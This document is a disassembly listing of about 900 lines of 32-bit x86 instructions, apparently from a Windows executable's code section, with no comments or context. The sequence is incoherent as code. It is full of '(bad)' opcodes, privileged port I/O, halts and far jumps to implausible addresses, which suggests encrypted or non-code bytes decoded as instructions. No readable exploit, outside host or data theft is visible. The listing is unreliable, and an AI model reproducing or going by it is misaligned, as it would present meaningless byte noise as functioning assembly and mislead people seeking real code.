  406e7b:	sbb    bl,BYTE PTR [ebp-0x147ee253]
  406e81:	enter  0x83b0,0x1
  406e85:	cmp    ebp,esp
  406e87:	jb     0x406eb2
  406e89:	xor    ebx,ebx
  406e8b:	xor    eax,0xe3479085
  406e90:	xchg   edi,eax
  406e91:	ret    
  406e92:	pusha  
  406e93:	nop
  406e94:	cmp    DWORD PTR [eax],eax
  406e96:	repnz sbb bh,0x0
  406e9a:	les    eax,FWORD PTR [ecx+0x7255c850]
  406ea0:	add    al,BYTE PTR [edi]
  406ea2:	les    edx,FWORD PTR [eax+eax*4]
  406ea5:	sbb    BYTE PTR cs:[esi],cl
  406ea8:	je     0x406e6e
  406eaa:	leave  
  406eab:	pop    ds
  406eac:	pop    edi
  406ead:	adc    DWORD PTR [edi],esi
  406eaf:	sub    al,0x8
  406eb1:	or     BYTE PTR [ecx],al
  406eb3:	mov    BYTE PTR [eax-0x73],al
  406eb6:	dec    ebp
  406eb7:	and    esp,DWORD PTR [eax+0x78]
  406eba:	inc    edi
  406ebb:	enter  0x7c90,0xe7
  406ebf:	adc    al,0x7b
  406ec1:	adc    BYTE PTR [ebp+0x3b],dh
  406ec4:	jmp    0xf13514fb
  406ec9:	paddsb mm7,mm2
  406ecc:	adc    al,BYTE PTR [edx+0x6ce8c7dc]
  406ed2:	rol    DWORD PTR [esi+0x15],cl
  406ed5:	hlt    
  406ed6:	nop
  406ed7:	inc    edx
  406ed8:	jns    0x406ed6
  406eda:	cmp    dl,BYTE PTR [eax+0x6c]
  406edd:	rcr    DWORD PTR [edx],0x87
  406ee0:	xor    eax,0x55f48761
  406ee5:	ret    0x92ac
  406ee8:	add    bh,BYTE PTR [edx]
  406eea:	ret    0x475b
  406eed:	add    eax,0x51fd2242
  406ef2:	push   0x623dc6c8
  406ef7:	push   ebp
  406ef8:	add    edi,esp
  406efa:	in     al,dx
  406efb:	xlat   BYTE PTR ds:[ebx]
  406efc:	mov    edx,0xd8b80240
  406f01:	and    eax,0xa359a0b4
  406f06:	pushf  
  406f07:	mov    al,0x93
  406f09:	dec    esp
  406f0a:	push   edx
  406f0b:	imul   ebp,DWORD PTR [edx],0xf4a0ec70
  406f11:	and    al,0x95
  406f13:	retf   
  406f14:	and    al,0xa4
  406f16:	jl     0x406f14
  406f18:	dec    ecx
  406f19:	push   cs
  406f1a:	cmp    ecx,ecx
  406f1c:	test   al,0x4
  406f1e:	(bad)  
  406f1f:	lods   al,BYTE PTR ds:[esi]
  406f20:	es cdq 
  406f22:	fs xchg edx,eax
  406f24:	or     al,0xb0
  406f26:	adc    al,0xb4
  406f28:	cdq    
  406f29:	fs xchg edx,eax
  406f2b:	dec    ecx
  406f2c:	sbb    al,0xb8
  406f2e:	and    al,0x64
  406f30:	xchg   edx,eax
  406f31:	dec    ecx
  406f32:	es mov esp,0x4992c02c
  406f38:	es cdq 
  406f3a:	xor    al,0xc4
  406f3c:	cmp    al,0x65
  406f3e:	xchg   edx,eax
  406f3f:	retf   0xc865
  406f42:	mov    BYTE PTR [esp+ecx*8-0x19],al
  406f46:	gs xchg edx,eax
  406f48:	retf   0x4c94
  406f4b:	rol    BYTE PTR [eax],1
  406f4d:	rcl    DWORD PTR [edx+0x5c9265ca],0xd4
  406f54:	ins    BYTE PTR es:[edi],dx
  406f55:	ins    BYTE PTR es:[edi],dx
  406f56:	gs xchg edx,eax
  406f58:	retf   0xd865
  406f5b:	fdivr  DWORD PTR [esp+ebx*8-0x36]
  406f5f:	gs xchg edx,eax
  406f61:	out    0x44,eax
  406f63:	ret    0xe08c
  406f66:	mov    al,0x92
  406f68:	out    0x65,eax
  406f6a:	xchg   edx,eax
  406f6b:	pushf  
  406f6c:	in     al,0x30
  406f6e:	ret    
  406f6f:	lods   al,BYTE PTR ds:[esi]
  406f70:	gs xchg edx,eax
  406f72:	retf   0xe865
  406f75:	mov    al,ds:0x674aecbc
  406f7a:	xchg   edx,eax
  406f7b:	out    0x10,eax
  406f7d:	(bad)  
  406f7e:	int3   
  406f7f:	lock add al,0x8c
  406f82:	dec    ebx
  406f83:	mov    edi,0x656c6f16
  406f88:	popa   
  406f89:	jne    0x406fff
  406f8b:	mov    bh,0xfa
  406f8d:	pop    ebx
  406f8e:	shr    BYTE PTR [ecx-0x597bced],0x54
  406f95:	jns    0x407007
  406f97:	pop    edi
  406f98:	jle    0x406f89
  406f9a:	pop    esp
  406f9b:	mov    eax,0x67654e27
  406fa0:	add    BYTE PTR [edi],cl
  406fa2:	outs   dx,DWORD PTR ds:[esi]
  406fa3:	je     0x406fe6
  406fa5:	fs fs retf 
  406fa8:	xchg   edi,eax
  406fa9:	mov    edi,0x6275532f
  406fae:	das    
  406faf:	dec    ebp
  406fb0:	jne    0x40701e
  406fb2:	inc    esp
  406fb3:	imul   esi,DWORD PTR [esi+0x79],0x49f2f664
  406fba:	imul   esi,DWORD PTR fs:[esi+0x6f],0x4f6e5f64
  406fc2:	jb     0x406fc4
  406fc4:	sti    
  406fc5:	inc    edi
  406fc6:	mov    esi,0x726f587c
  406fcb:	inc    ebx
  406fcc:	ins    DWORD PTR es:[edi],dx
  406fcd:	jo     0x407003
  406fcf:	inc    esi
  406fd0:	jb     0x407041
  406fd2:	ins    DWORD PTR es:[edi],dx
  406fd3:	push   ebx
  406fd4:	je     0x407000
  406fd6:	daa    
  406fd7:	fs dec eax
  406fd9:	mov    esi,0x4438521f
  406fde:	popa   
  406fdf:	stc    
  406fe0:	les    esp,FWORD PTR [esi-0x25]
  406fe3:	je     0x40704a
  406fe5:	and    ecx,DWORD PTR [edi+0x6f423f79]
  406feb:	outs   dx,DWORD PTR ds:[esi]
  406fec:	ins    BYTE PTR es:[edi],dx
  406fed:	sbb    esp,0x734201d9
  406ff3:	adc    BYTE PTR [edi],bl
  406ff5:	inc    ebx
  406ff6:	jns    0x406ff8
  406ff8:	push   ebp
  406ff9:	jo     0x406f7c
  406ffb:	mov    ecx,0xe76f1f8f
  407000:	and    DWORD PTR [edi],ebp
  407002:	cmp    esp,esp
  407004:	add    eax,ecx
  407006:	hlt    
  407007:	or     al,cl
  407009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40700a:	push   cs
  40700b:	or     eax,0x525f471
  407010:	mov    ch,0xcc
  407012:	xchg   esi,eax
  407013:	xchg   ebp,eax
  407014:	mov    BYTE PTR [edi],ah
  407016:	sbb    bh,dl
  407018:	jne    0x406fd7
  40701a:	(bad)  
  40701b:	mov    esi,0x1920fff7
  407020:	pop    edx
  407021:	fimul  WORD PTR [ebx+edx*1]
  407024:	sbb    BYTE PTR ds:0x603c2a82,bl
  40702a:	xor    cl,0x6
  40702d:	xor    al,0xc8
  40702f:	fnstcw WORD PTR [esi]
  407031:	enter  0xbb10,0xd7
  407035:	xchg   BYTE PTR [esi+0x64a1ab8],bh
  40703b:	add    DWORD PTR [esi],ebx
  40703d:	ror    BYTE PTR [eax-0x20],0xf4
  407041:	enter  0x246f,0xed
  407045:	out    0xbd,eax
  407047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407048:	(bad)  [esi]
  40704a:	sub    dh,ch
  40704c:	mov    ah,0xe8
  40704e:	push   es
  40704f:	enter  0x41e,0x23
  407053:	lahf   
  407054:	ja     0x406ff5
  407056:	mov    al,0x24
  407058:	in     al,dx
  407059:	dec    esi
  40705a:	push   es
  40705b:	call   0x86589bcc
  407060:	aas    
  407061:	iret   
  407062:	jnp    0x40707a
  407064:	cld    
  407065:	ss mov al,0xa4
  407068:	adc    dl,BYTE PTR [ebx+eax*2+0x75]
  40706c:	dec    esi
  40706d:	jmp    0x40708d
  40706f:	cmp    ecx,DWORD PTR [eax+ecx*2]
  407072:	inc    edi
  407073:	cmp    edx,DWORD PTR [eax-0x3e4d36f4]
  407079:	push   0x4a
  40707b:	mov    ah,0x31
  40707d:	addr16 pusha 
  40707f:	adc    BYTE PTR ds:0x8adad40,ah
  407085:	sub    eax,eax
  407087:	repnz repnz and cl,bl
  40708b:	(bad)  
  40708c:	test   cl,cl
  40708e:	test   cl,cl
  407090:	add    BYTE PTR [edi+0x7],ah
  407093:	sub    ebp,0xb5451651
  407099:	cmp    eax,0x80a3c5e
  40709e:	dec    edi
  40709f:	or     al,0xfa
  4070a1:	data16 js 0x4070a9
  4070a4:	jb     0x40706b
  4070a6:	(bad)  
  4070a7:	call   0x4a50b5c1
  4070ac:	add    DWORD PTR [ebx],ebp
  4070ae:	test   eax,0x2920dd15
  4070b3:	push   ss
  4070b4:	dec    dl
  4070b6:	lods   eax,DWORD PTR ds:[esi]
  4070b8:	push   ss
  4070b9:	nop
  4070ba:	mov    al,bh
  4070bc:	imul   ecx,DWORD PTR [edx],0xffffffe4
  4070bf:	and    bh,BYTE PTR [ecx-0x254f4f39]
  4070c5:	out    dx,eax
  4070c6:	mov    esp,ecx
  4070c8:	pop    ss
  4070c9:	push   edi
  4070ca:	inc    ecx
  4070cb:	jb     0x407134
  4070cd:	retf   
  4070ce:	adc    al,0xcb
  4070d0:	(bad)  
  4070d1:	fst    QWORD PTR [edi+0x21]
  4070d4:	daa    
  4070d5:	adc    al,0xcb
  4070d7:	inc    edx
  4070d8:	popa   
  4070d9:	fs adc cl,al
  4070dc:	inc    ebp
  4070dd:	sar    BYTE PTR [ebp+0x7b],cl
  4070e0:	(bad)  
  4070e1:	js     0x40715b
  4070e3:	mov    eax,0x1515c960
  4070e8:	xchg   esp,eax
  4070e9:	fs gs js 0x4070f2
  4070ed:	jb     0x4070c0
  4070ef:	outs   dx,BYTE PTR ds:[esi]
  4070f0:	push   edi
  4070f1:	fadd   st(7),st
  4070f3:	fcom   QWORD PTR [eax+esi*4]
  4070f6:	or     eax,0xb6411872
  4070fb:	popa   
  4070fc:	jns    0x4070eb
  4070fe:	int    0x2
  407100:	out    dx,al
  407101:	sub    ch,BYTE PTR [ebx+0x65]
  407104:	fs push edi
  407106:	inc    esp
  407107:	int3   
  407108:	iret   
  407109:	loopne 0x40712c
  40710b:	xchg   edx,eax
  40710c:	adc    eax,DWORD PTR [esp+ecx*8+0x43]
  407110:	jb     0x407177
  407112:	jb     0x4070a5
  407114:	or     al,0x1b
  407116:	sbb    bh,cl
  407118:	lods   al,BYTE PTR ds:[esi]
  407119:	lods   al,BYTE PTR ds:[esi]
  40711a:	adc    eax,0x14057208
  40711f:	jp     0x40716a
  407121:	dec    esi
  407122:	and    al,0x87
  407124:	loopne 0x407193
  407126:	jo     0x407194
  407128:	xchg   edi,eax
  407129:	adc    ch,cl
  40712b:	adc    ch,cl
  40712d:	or     cl,BYTE PTR [esp+ebp*4]
  407130:	inc    edx
  407131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407132:	jno    0x4070bf
  407134:	fs pop eax
  407136:	iret   
  407137:	js     0x407177
  407139:	jbe    0x407163
  40713b:	dec    esi
  40713c:	vandnps ymm5,ymm7,YMMWORD PTR [esi-0xa]
  407141:	mov    esi,0x5b8e7463
  407146:	mov    ah,0x2b
  407148:	xor    eax,0xc73ec7dc
  40714d:	mov    ecx,ecx
  40714f:	jg     0x40717b
  407151:	inc    esp
  407152:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  407159:	and    ah,BYTE PTR [esi]
  40715b:	aas    
  40715c:	pusha  
  40715d:	(bad)  
  40715e:	xor    bh,BYTE PTR [esi]
  407160:	into   
  407161:	and    al,0x8e
  407163:	nop
  407164:	js     0x40713a
  407166:	jo     0x40712d
  407168:	cld    
  407169:	or     DWORD PTR [ebx],0xffffff88
  40716c:	lods   al,BYTE PTR ds:[esi]
  40716d:	neg    BYTE PTR [ecx+ecx*8-0x573bff5d]
  407174:	les    eax,FWORD PTR [ebp-0x32]
  407177:	xchg   ebx,eax
  407178:	call   0x59e4:0x4fba83f6
  40717f:	in     al,dx
  407180:	add    al,0xe8
  407182:	in     al,0x4
  407184:	(bad)  
  407185:	scas   al,BYTE PTR es:[edi]
  407186:	and    al,0x7
  407188:	xlat   BYTE PTR ds:[ebx]
  407189:	retf   
  40718a:	in     eax,dx
  40718b:	adc    BYTE PTR [eax+0x3e],dl
  40718e:	leave  
  40718f:	f2xm1  
  407191:	lock or esp,DWORD PTR [esi]
  407194:	call   0xca00f5a1
  407199:	mov    eax,esi
  40719b:	call   0x2209e491
  4071a0:	das    
  4071a1:	es in  al,0xa1
  4071a4:	jl     0x4071fc
  4071a6:	in     al,0x70
  4071a8:	nop
  4071a9:	aas    
  4071aa:	adc    DWORD PTR [ebx],0xe45ecede
  4071b0:	mov    edx,0x83c11e03
  4071b5:	mov    al,0x4f
  4071b7:	fild   QWORD PTR [esi]
  4071b9:	iret   
  4071ba:	inc    eax
  4071bb:	es fs inc eax
  4071be:	pop    eax
  4071bf:	cmp    BYTE PTR [eax+0xe],cl
  4071c2:	test   DWORD PTR [ebp+esi*1+0xcfc7cf],ebx
  4071c9:	jns    0x4071eb
  4071cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071cc:	mov    al,0x57
  4071ce:	add    dl,cl
  4071d0:	add    DWORD PTR [ecx],edi
  4071d2:	add    edx,esi
  4071d4:	into   
  4071d5:	iret   
  4071d6:	push   ds
  4071d7:	sar    BYTE PTR [ecx-0x80],1
  4071da:	pushf  
  4071db:	nop
  4071dc:	cmp    al,bh
  4071de:	retf   
  4071df:	and    eax,0x421c08d0
  4071e4:	or     BYTE PTR [edi+0x275171ff],dl
  4071ea:	aad    0x6d
  4071ec:	rcr    BYTE PTR [ebx],cl
  4071ee:	cmp    eax,0x8002000a
  4071f3:	jg     0x40722e
  4071f5:	mov    BYTE PTR [esi+0x66],ch
  4071f8:	adc    DWORD PTR [ebx],ecx
  4071fa:	add    eax,0xed3f1d19
  4071ff:	or     eax,0x264e3a21
  407204:	clc    
  407205:	sub    eax,0x2e7fbffe
  40720a:	jl     0x407216
  40720c:	push   esi
  40720d:	pop    esp
  40720e:	push   eax
  40720f:	scas   al,BYTE PTR es:[edi]
  407210:	shl    ecx,0x2d
  407213:	or     BYTE PTR [ebx+0x3a],bl
  407216:	mov    bl,0x7f
  407218:	inc    esi
  407219:	je     0x40725a
  40721b:	dec    eax
  40721c:	je     0x407280
  40721e:	sbb    eax,0x4a66690b
  407223:	mov    ebx,0x9f640213
  407228:	xor    BYTE PTR [eax-0x7c201fda],dl
  40722e:	leave  
  40722f:	jbe    0x40727a
  407231:	jbe    0x407230
  407233:	add    BYTE PTR [edi*4+0x41c212f0],bh
  40723a:	inc    eax
  40723b:	push   ds
  40723c:	enter  0xb306,0x1c
  407240:	pop    eax
  407241:	enter  0x21ca,0x3f
  407245:	stc    
  407246:	pop    esi
  407247:	dec    ebx
  407248:	pop    esi
  407249:	mov    esi,0xb4a1f8e0
  40724e:	push   esi
  40724f:	in     al,0x2d
  407251:	and    eax,0x4a00f8cf
  407256:	hlt    
  407257:	mov    eax,ds:0x57e457e4
  40725c:	repnz cmp esp,esi
  40725f:	sub    al,0xcb
  407261:	lock mov eax,ds:0x1f25848
  407267:	in     al,0x39
  407269:	lock nop
  40726b:	in     al,dx
  40726c:	mov    eax,ds:0x2bf2578c
  407271:	stc    
  407272:	sbb    al,0xec
  407274:	pusha  
  407275:	int3   
  407276:	call   0x9e974b1c
  40727b:	push   esi
  40727c:	repnz sbb al,0xe8
  40727f:	les    esp,FWORD PTR [esi]
  407281:	in     al,dx
  407282:	mov    DWORD PTR [ebx+0x7b644260],0x408c73eb
  40728c:	ror    DWORD PTR ds:[eax+eiz*8+0x45],cl
  407291:	loopne 0x4072bf
  407293:	int    0xa6
  407295:	jecxz  0x407268
  407297:	clc    
  407298:	push   eax
  407299:	mov    eax,ds:0xfa006228
  40729e:	enter  0x520,0x42
  4072a2:	sti    
  4072a3:	int3   
  4072a4:	or     ecx,DWORD PTR [ecx-0x2bf32fa3]
  4072aa:	add    al,ah
  4072ac:	sar    DWORD PTR [ecx*2-0x27cf3b2f],cl
  4072b3:	fmul   st(0),st
  4072b5:	add    al,BYTE PTR [eax]
  4072b7:	test   eax,0xa1c0724c
  4072bc:	cmp    al,0xc0
  4072be:	addr16 push 0x74f191c8
  4072c4:	rol    BYTE PTR [esi+0xb892bc0],cl
  4072ca:	mov    ecx,0x8bae04a
  4072cf:	ficomp WORD PTR [edi]
  4072d1:	push   0xd00a5be1
  4072d6:	xor    al,al
  4072d8:	and    al,0xe5
  4072da:	ror    DWORD PTR [ecx],1
  4072dc:	dec    esp
  4072dd:	out    dx,eax
  4072de:	sub    al,0xfe
  4072e0:	jmp    0x407353
  4072e2:	sub    BYTE PTR [eax],dl
  4072e4:	ss add eax,0xd740eea
  4072ea:	adc    al,dl
  4072ec:	in     al,dx
  4072ed:	fistp  DWORD PTR [ebx]
  4072ef:	shl    cl,0xbe
  4072f2:	inc    esp
  4072f3:	jmp    0x407305
  4072f5:	adc    eax,0x67eb34bf
  4072fa:	enter  0x9e89,0x88
  4072fe:	daa    
  4072ff:	iret   
  407300:	push   es
  407301:	rol    DWORD PTR [ecx],cl
  407303:	repnz inc eax
  407305:	push   cs
  407306:	je     0x40735e
  407308:	nop
  407309:	int    0x5f
  40730b:	pop    eax
  40730c:	and    esp,esp
  40730e:	or     eax,0xc18176d3
  407313:	add    BYTE PTR [edi],dl
  407315:	hlt    
  407316:	pop    ss
  407317:	sbb    edx,DWORD PTR [edx+0x4c1548b]
  40731d:	add    edx,DWORD PTR [ecx+eax*8]
  407320:	push   0xffffffc5
  407322:	rcr    BYTE PTR [edi-0x7c6bc48b],0x9c
  407329:	setg   dl
  40732c:	dec    eax
  40732d:	test   BYTE PTR [edx+eax*8],0xa1
  407331:	push   cs
  407332:	adc    ah,dl
  407334:	jecxz  0x407315
  407336:	push   0x8b99fb8
  40733b:	retf   0xff64
  40733e:	test   BYTE PTR [ecx+0x77f7db45],al
  407344:	jbe    0x4073a0
  407346:	mov    WORD PTR [ebx+edi*2-0x27],gs
  40734a:	mov    esi,DWORD PTR [ebp+0x8]
  40734d:	add    ebx,DWORD PTR [esi+eax*8-0x637b8a6d]
  407354:	xchg   BYTE PTR [ebp+0x32],cl
  407357:	or     DWORD PTR [ebx],ebp
  407359:	jg     0x40737d
  40735b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40735c:	mov    dl,0xeb
  40735e:	test   ecx,0xa814587a
  407364:	mov    WORD PTR [edx+0x2cd996d],es
  40736a:	mov    dh,0x12
  40736c:	push   edx
  40736d:	dec    eax
  40736e:	mov    bl,al
  407370:	cmp    al,0x5e
  407372:	inc    ebp
  407373:	popa   
  407374:	fs dec esi
  407376:	das    
  407377:	call   0x35386c78
  40737c:	pop    esi
  40737d:	test   esp,edi
  40737f:	mov    esi,0x140f60b
  407384:	and    BYTE PTR [edx-0xa],ah
  407387:	mov    ebp,0x57b641
  40738c:	pop    es
  40738d:	and    BYTE PTR [edx-0x3e],0x78
  407391:	sub    esp,DWORD PTR [esi+0x28]
  407394:	lods   eax,DWORD PTR ds:[esi]
  407395:	iret   
  407396:	and    BYTE PTR [eax-0x4421f0a9],0x86
  40739d:	mov    ah,BYTE PTR [eax+ecx*2+0x22]
  4073a1:	inc    esp
  4073a2:	xchg   ebp,eax
  4073a3:	pop    edi
  4073a4:	cmp    eax,DWORD PTR [esi+0x40c4fd91]
  4073aa:	je     0x4073bf
  4073ac:	dec    ecx
  4073ad:	sbb    BYTE PTR [eax],al
  4073af:	xchg   esi,eax
  4073b0:	shl    DWORD PTR [edx-0x1407b04f],cl
  4073b6:	(bad)  
  4073b8:	and    DWORD PTR [eax+edi*8],ebx
  4073bb:	sub    DWORD PTR [eax-0x48f00cb6],edi
  4073c1:	add    al,dh
  4073c3:	popf   
  4073c4:	or     ecx,DWORD PTR [ebx+0x7b]
  4073c7:	lock das 
  4073c9:	inc    esi
  4073ca:	imul   eax,DWORD PTR [ebx+0x33],0xffffffff
  4073ce:	lea    esi,[ebp-0x17ab3973]
  4073d4:	sbb    ebx,DWORD PTR [edi+0x4a]
  4073d7:	jo     0x4073e4
  4073d9:	sub    cl,BYTE PTR [ebp+0xfce0147]
  4073df:	mov    ?,WORD PTR [esp+eiz*2-0x8]
  4073e3:	mov    ah,0x88
  4073e5:	and    DWORD PTR [ebp+0x6fbbf485],ecx
  4073eb:	rcl    eax,0x37
  4073ee:	nop
  4073ef:	pop    ecx
  4073f0:	adc    DWORD PTR [ebp+0x26502b43],0x4d9150b
  4073fa:	inc    edx
  4073fb:	pop    ds
  4073fc:	and    BYTE PTR [edi+0x50],al
  4073ff:	and    DWORD PTR [edi],eax
  407401:	cmp    ebp,ebp
  407403:	dec    ebx
  407404:	jne    0x4073a4
  407406:	jmp    0x407422
  407408:	inc    ebx
  407409:	mov    WORD PTR [ebp+0x3905100a],cs
  40740f:	pop    ss
  407410:	dec    eax
  407411:	or     bl,dl
  407413:	loope  0x40745c
  407415:	(bad)  [edi-0x1c]
  407418:	dec    eax
  407419:	repz push ebp
  40741b:	dec    ebx
  40741c:	pop    edi
  40741d:	ret    
  40741e:	or     al,0x59
  407420:	cwde   
  407421:	mov    ebx,0x2aca6ab4
  407426:	out    0xec,al
  407428:	test   DWORD PTR [ebx-0x13],ebx
  40742b:	cmp    edi,DWORD PTR [edi+esi*1]
  40742e:	sbb    DWORD PTR [eax-0x533aebc3],ebx
  407434:	ins    DWORD PTR es:[edi],dx
  407435:	sub    al,0x4f
  407437:	(bad)  
  407439:	cmp    al,0x75
  40743b:	mov    ch,0x50
  40743d:	cld    
  40743e:	mov    al,0x24
  407440:	rol    DWORD PTR [ecx-0x38],0x2c
  407444:	mov    bh,0x6f
  407446:	pushf  
  407447:	neg    BYTE PTR ds:0xfed0a494
  40744d:	adc    al,0x73
  40744f:	or     eax,0x5beb3f53
  407454:	sbb    eax,0x72451fad
  407459:	add    DWORD PTR [ebp+0xf],esi
  40745c:	mov    eax,ds:0xb3f79a8d
  407461:	test   DWORD PTR [ebx-0x9],eax
  407464:	jmp    0x4074ab
  407466:	sub    al,BYTE PTR [ecx]
  407468:	or     bl,BYTE PTR [ebx-0x9db3877]
  40746e:	or     al,0x68
  407470:	sbb    al,0x34
  407472:	xor    ax,0xecf4
  407476:	mov    dh,bh
  407478:	repnz and BYTE PTR [ecx+ecx*1-0x27],dh
  40747d:	cwde   
  40747e:	jmp    0x4074a4
  407480:	repnz into 
  407482:	add    dl,BYTE PTR [ebp+ecx*2-0x29b3213a]
  407489:	(bad)  
  40748a:	fcmovb st,st(7)
  40748c:	adc    bl,BYTE PTR [eax+0x24]
  40748f:	jmp    0x40749c
  407491:	mov    ecx,0x8f645d69
  407496:	xchg   DWORD PTR [edx+0x60],esi
  407499:	mov    edi,0xa0f40675
  40749e:	arpl   WORD PTR [edi+0x6d],sp
  4074a1:	jnp    0x407468
  4074a3:	adc    al,0x16
  4074a5:	push   eax
  4074a6:	jne    0x407500
  4074a8:	mov    ecx,0x3f554790
  4074ad:	(bad)
  4074b0:	nop
  4074b1:	mov    esi,edi
  4074b3:	cmp    BYTE PTR [ebp+0x4389da85],cl
  4074b9:	inc    ebx
  4074ba:	cmp    al,BYTE PTR [edi]
  4074bc:	push   edx
  4074bd:	xchg   esp,eax
  4074be:	add    ecx,DWORD PTR ss:[eax+0x37479571]
  4074c5:	sub    ecx,DWORD PTR ds:0xe81f438b
  4074cb:	or     DWORD PTR [eax],ebx
  4074cd:	pop    esp
  4074ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074cf:	mov    dl,dh
  4074d1:	mov    ebp,0x24dcdc13
  4074d6:	push   edi
  4074d7:	enter  0xe881,0xe8
  4074db:	and    esp,DWORD PTR [eax]
  4074dd:	pop    ss
  4074de:	xor    bl,ah
  4074e0:	(bad)  
  4074e2:	mov    edx,0xfd92e5bb
  4074e7:	stc    
  4074e8:	push   eax
  4074e9:	push   0xc
  4074eb:	jno    0x40746d
  4074ed:	call   0x3b5d52de
  4074f2:	or     bl,BYTE PTR [ebp-0x43]
  4074f5:	or     eax,DWORD PTR [eax]
  4074f7:	jge    0x4074b8
  4074f9:	rol    BYTE PTR [ebp-0x744dd085],1
  4074ff:	aas    
  407500:	adc    eax,0x15200c70
  407505:	mov    edx,0xb825488a
  40750a:	push   ebx
  40750b:	adc    ch,BYTE PTR [edi-0x63565bf2]
  407511:	lds    ebp,FWORD PTR [edx+edx*2+0x481ce8e4]
  407518:	push   ecx
  407519:	inc    edx
  40751a:	in     al,dx
  40751b:	loopne 0x407509
  40751d:	icebp  
  40751e:	pop    ebx
  40751f:	mov    eax,0x4d627b90
  407524:	call   DWORD PTR [ebp+0x644e57a6]
  40752a:	dec    ecx
  40752b:	inc    ebp
  40752d:	fmul   QWORD PTR [ebp+0x55312eb]
  407533:	ror    DWORD PTR [esi],1
  407535:	add    DWORD PTR [ecx-0x3337b4d4],edi
  40753b:	push   ds
  40753c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40753d:	push   0x2e7f8107
  407542:	add    esi,DWORD PTR [eiz*1+0x27400912]
  407549:	cmp    BYTE PTR [esi],bh
  40754b:	xor    esi,edx
  40754d:	imul   edx,ebx,0x3b560eff
  407553:	sub    al,0x79
  407555:	cli    
  407556:	adc    BYTE PTR [edx],ch
  407558:	dec    edi
  407559:	call   DWORD PTR [edi]
  40755b:	add    edx,ecx
  40755d:	or     BYTE PTR [ebx+0x447d3e9d],bl
  407563:	mov    edx,DWORD PTR [esi+0x4b]
  407566:	cld    
  407567:	ja     0x407568
  407569:	add    DWORD PTR [ebx],edx
  40756b:	data16 cmp al,0xdd
  40756e:	sbb    al,al
  407570:	mov    DWORD PTR [ebx],edi
  407572:	fdiv   QWORD PTR [edx]
  407574:	pop    esp
  407575:	adc    al,0x93
  407577:	icebp  
  407578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407579:	test   eax,0xb910c741
  40757e:	sbb    al,0xd8
  407580:	ds or  dl,dh
  407583:	cld    
  407584:	push   ebx
  407585:	(bad)  
  407586:	imul   eax,esi,0x38
  407589:	jmp    0x4075b5
  40758b:	(bad)  
  40758c:	pop    edx
  40758d:	or     esi,DWORD PTR [eax-0x75]
  407590:	es dec edx
  407592:	or     ch,ah
  407594:	mov    es,WORD PTR [esi+0x28e81821]
  40759a:	jmp    0x4075a8
  40759c:	cmc    
  40759d:	clc    
  40759e:	xchg   edi,eax
  40759f:	mov    al,0x82
  4075a1:	xlat   BYTE PTR ds:[ebx]
  4075a2:	inc    esp
  4075a3:	cmp    esi,ebx
  4075a5:	je     0x4075dd
  4075a7:	mov    al,0x5c
  4075a9:	or     bh,BYTE PTR [esi]
  4075ab:	pop    ebx
  4075ac:	jne    0x4075d4
  4075ae:	push   0x83edc606
  4075b3:	test   DWORD PTR [ecx+0x446eab4],esi
  4075b9:	or     cl,BYTE PTR [eax]
  4075bb:	mov    DWORD PTR [edi-0x2d],eax
  4075be:	xor    al,0x8
  4075c0:	or     al,0xc
  4075c2:	hlt    
  4075c3:	sbb    ebx,DWORD PTR [ecx]
  4075c5:	mov    WORD PTR [edi],gs
  4075c7:	cdq    
  4075c8:	enter  0xd720,0x0
  4075cc:	mov    ecx,DWORD PTR [ecx-0x57cd3ae9]
  4075d2:	adc    esp,DWORD PTR [edx]
  4075d4:	pop    ebx
  4075d5:	sbb    DWORD PTR [edi],edi
  4075d7:	mov    bl,0xa1
  4075d9:	mov    eax,0xdb9818dc
  4075de:	fidivr DWORD PTR [ebp-0x4599e5ef]
  4075e4:	push   es
  4075e5:	add    ch,dh
  4075e7:	test   BYTE PTR [ebx+0x19],bl
  4075ea:	nop
  4075eb:	add    ebp,ebp
  4075ed:	outs   dx,DWORD PTR ds:[si]
  4075ef:	fs push edi
  4075f1:	pop    es
  4075f2:	adc    bl,BYTE PTR [ebx+eax*2+0x21]
  4075f6:	mov    edi,0xe4d8be79
  4075fb:	adc    DWORD PTR [edx+0x569dda3a],esp
  407601:	mov    eax,ds:0xc8e022e8
  407606:	rcl    DWORD PTR [ebx-0x5deb5ff5],0x1
  40760d:	aaa    
  40760e:	ja     0x40765b
  407610:	out    0x4f,al
  407612:	je     0x40761a
  407614:	and    ebp,ebx
  407616:	inc    edx
  407617:	add    BYTE PTR [edi+0x4],al
  40761a:	sbb    al,0xfa
  40761c:	adc    edi,ecx
  40761e:	cld    
  40761f:	add    al,BYTE PTR [esi+0x77]
  407622:	push   esi
  407623:	ss pop ebx
  407625:	jl     0x4075c4
  407627:	xor    edx,DWORD PTR [edx+ebx*4+0x43]
  40762b:	call   0x2cf4:0xf0f040fc
  407632:	and    DWORD PTR [edi+0xc],eax
  407635:	shl    ah,cl
  407637:	add    eax,0x73c91865
  40763c:	mov    BYTE PTR [edi+0x63f0da41],dl
  407642:	dec    eax
  407643:	addr16 in al,dx
  407645:	push   edi
  407646:	pop    ds
  407647:	call   0x37d3e844
  40764c:	sbb    DWORD PTR [edi],eax
  40764e:	fstp   TBYTE PTR [edx-0x39]
  407651:	sbb    al,0xee
  407653:	add    BYTE PTR [edi+0x6ae5bf34],0x8
  40765a:	mov    bl,0x53
  40765c:	inc    ecx
  40765d:	inc    ebx
  40765e:	and    BYTE PTR [eax],cl
  407660:	shl    DWORD PTR [ecx-0x3fc7440c],0x58
  407667:	pop    edi
  407668:	les    eax,FWORD PTR [ecx-0x7229467e]
  40766e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40766f:	lahf   
  407670:	sbb    edi,DWORD PTR [edx+esi*2]
  407673:	clc    
  407674:	xor    eax,0xca458bb8
  407679:	outs   dx,DWORD PTR ds:[esi]
  40767a:	jg     0x4075fe
  40767c:	inc    ebp
  40767d:	ror    BYTE PTR [ebx],cl
  40767f:	mov    eax,ds:0x96d7a434
  407684:	loope  0x4076b0
  407686:	jb     0x40768c
